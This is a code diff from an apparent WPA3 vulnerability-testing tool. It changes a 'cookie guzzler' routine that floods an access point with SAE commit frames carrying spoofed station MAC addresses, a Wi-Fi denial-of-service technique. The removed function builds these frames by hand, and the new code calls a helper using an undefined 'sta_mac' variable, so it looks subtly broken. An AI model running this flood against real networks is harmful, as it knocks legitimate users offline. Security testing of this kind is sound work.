@@ -19,50 +19,16 @@ using namespace Tins;
 using namespace chrono;
 
 namespace wpa3_tester::cookie_guzzler{
-RadioTap get_cookie_guzzler_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac,
-								const sae_helper::SAEPair &sae_params
-){ //TODO nejde přepsat pomocí dos_helper make_sae_commit?
-	// Build the 802.11 Auth frame
-	Dot11Authentication auth;
-	auth.addr1(ap_mac);  // destination (BSSID)
-	auth.addr2(sta_mac); // spoofed source
-	auth.addr3(ap_mac);  // BSSID
-	auth.type(Dot11::MANAGEMENT);
-	auth.subtype(Dot11::AUTH);
-
-	auth.auth_algorithm(3);  // algo=3  (SAE)
-	auth.auth_seq_number(1); // commit
-	auth.status_code(0);
-
-	// Build SAE commit frame with proper FFC format
-	vector<uint8_t> current_payload;
-
-	current_payload.push_back(0x13);
-	current_payload.push_back(0x00); // Group: 19 (finite field cyclic group)
-
-	for(size_t i = 0; i < 32 && i < sae_params.scalar.size(); ++i){
-		current_payload.push_back(sae_params.scalar[i]);
-	}
-
-	for(size_t i = 0; i < 64 && i < sae_params.element.size(); ++i){
-		current_payload.push_back(sae_params.element[i]);
-	}
-
-	const RawPDU raw_data(current_payload);
-	auth.inner_pdu(raw_data);
-
-	RadioTap radiotap;
-	radiotap.inner_pdu(auth);
-	return radiotap;
-}
 
 void check_vuln(const string &iface_name, const HWAddress<6> &ap_mac, const int attack_time,
 				const sae_helper::SAEPair &sae_params, const string &att_mac, const size_t burst_size,
 				const size_t packets_per_second_limit
 ){
 	PacketSender sender(iface_name);
-	dos_helpers::timed_burst(sender, attack_time, burst_size, packets_per_second_limit, [&]() ->optional<RadioTap>{
-		return get_cookie_guzzler_frame(ap_mac, firmware::get_random_ath_masker_mac(att_mac), sae_params);
+	dos_helpers::timed_burst(sender, attack_time, burst_size, packets_per_second_limit,
+	[&]() -> optional<RadioTap>{
+		// get cookie_guzzler frame
+		return sae_helper::make_sae_commit(ap_mac, sta_mac, sae_params);
 	});
 }
 
